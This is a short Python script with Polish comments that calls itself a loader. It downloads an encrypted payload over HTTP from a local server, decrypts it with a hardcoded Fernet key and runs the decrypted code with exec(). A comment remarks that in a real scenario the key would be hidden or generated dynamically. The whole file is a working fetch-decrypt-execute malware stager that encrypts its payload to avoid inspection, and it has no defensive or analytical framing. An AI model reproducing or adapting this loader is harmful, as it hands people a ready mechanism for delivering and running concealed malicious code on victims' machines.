import requests
from cryptography.fernet import Fernet

# --- Konfiguracja ---
PAYLOAD_URL = "http://localhost:8000/encrypted_payload.txt"
# Klucz szyfrujący payload. W prawdziwym scenariuszu byłby ukryty/generowany dynamicznie.
ENCRYPTION_KEY = b"zKt94eqysoWjmft9pRMWDhXWqVMN7fN4NmGez0DJoNs=" # Pamiętaj o 'b' przed kluczem!
# --------------------

def download_encrypted_payload(url):
    """Pobiera zaszyfrowany payload z podanego URL."""
    try:
        response = requests.get(url)
        response.raise_for_status() # Sprawdź, czy nie ma błędów HTTP
        return response.content # Zwróć zawartość jako bajty
    except requests.exceptions.RequestException as e:
        print(f"Błąd podczas pobierania payloadu: {e}")
        return None

def decrypt_payload(encrypted_data, key):
    """Deszyfruje payload za pomocą klucza Fernet."""
    try:
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        print(f"Błąd podczas deszyfrowania payloadu: {e}")
        return None

print("--- Uruchamiam Loader ---")

# 1. Pobierz zaszyfrowany payload
encrypted_payload = download_encrypted_payload(PAYLOAD_URL)

if encrypted_payload:
    print(f"Pobrano zaszyfrowany payload (rozmiar: {len(encrypted_payload)} bajtów).")
    
    # 2. Odszyfruj payload
    decrypted_payload_code = decrypt_payload(encrypted_payload, ENCRYPTION_KEY)
    
    if decrypted_payload_code:
        print("Payload odszyfrowany. Uruchamiam...")
        print("------------------------------------")
        # 3. Wykonaj odszyfrowany kod
        exec(decrypted_payload_code)
        print("------------------------------------")
        print("Payload zakończył działanie.")
    else:
        print("Nie udało się odszyfrować payloadu.")
else:
    print("Nie udało się pobrać payloadu. Sprawdź, czy serwer webowy działa.")

print("--- Loader zakończył działanie ---")